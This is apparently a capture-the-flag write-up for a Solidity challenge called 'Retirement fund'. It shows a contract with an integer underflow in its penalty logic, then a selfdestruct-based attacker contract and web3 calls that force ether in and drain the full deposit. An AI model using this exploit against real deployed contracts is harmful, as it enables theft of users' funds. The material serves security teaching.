# 11. Retirement fund

This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement.

I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).

I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!

## Target contract

```solidity
pragma solidity ^0.4.21;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = now + 10 years;

    function RetirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty
            msg.sender.transfer(address(this).balance * 9 / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
}
```

## Vulnerability

The issue here is `uint256 withdrawn = startBalance - address(this).balance;` inside `collectPenalty`. The contract has no real control over its global ETH balance. You may have read from the documentation that since solidity 0.4.0, fallback functions must be marked as payable otherwise the contract will throw and that is correct, for example doing the following will not increase the target contract's balance but revert instead :

```js
const challengeContract = "0xc1dEe7412AAB848e12bF11325f0DC8d5cabdb7f6";

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  value: 1,
});
```

There is one highly controversial mechanism in solidity that can bypass any verifications : `selfdestruct`. So if we write a contract that holds some ETH and `selfdestruct` to the challengeContract address it will forward all of its balance to it, effectively bypassing any fallback / receive function as no code from the challenge contract will actually be executed.

Let's deploy the following contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
  address targetContract;
  
  constructor (address _targetContract) payable {
    require(msg.value > 0);
    targetContract = _targetContract;
  }

  function attack() public {
    selfdestruct(payable(targetContract));
  }
}
```

And call it's attack function to force an ETH transfer to the target contract :

```js
const adversarialContract = "0xe090d618A3329A987C0A09837284Bd95E5cE9FcA";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "attack",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: adversarialContract,
  data: data,
});
```

We can check that the balance of the challenge contract is greater than 1 ETH :

```js
const challengeContract = "0xc1dEe7412AAB848e12bF11325f0DC8d5cabdb7f6";

const challengeBalance = await web3.eth.getBalance(challengeContract);
console.log(challengeBalance);
// 1000000000000000001 or 1 ETH = 1 wei as I deployed the adversarial contract with 1 wei
```

Now we can call `collectPenalty` on the target contract as `uint256 withdrawn = startBalance - address(this).balance;` is greater than 0. We actually cause an underflow here, meaning that `withdrawn` equals `2^256` - the value that we sent to our adversarial contract upon deploiement.

```js
const challengeContract = "0xc1dEe7412AAB848e12bF11325f0DC8d5cabdb7f6";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "collectPenalty",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```
Where we stole not 0.1 ETH but the whole 1 ETH deposit... Submit the challenge and move on to the next one !
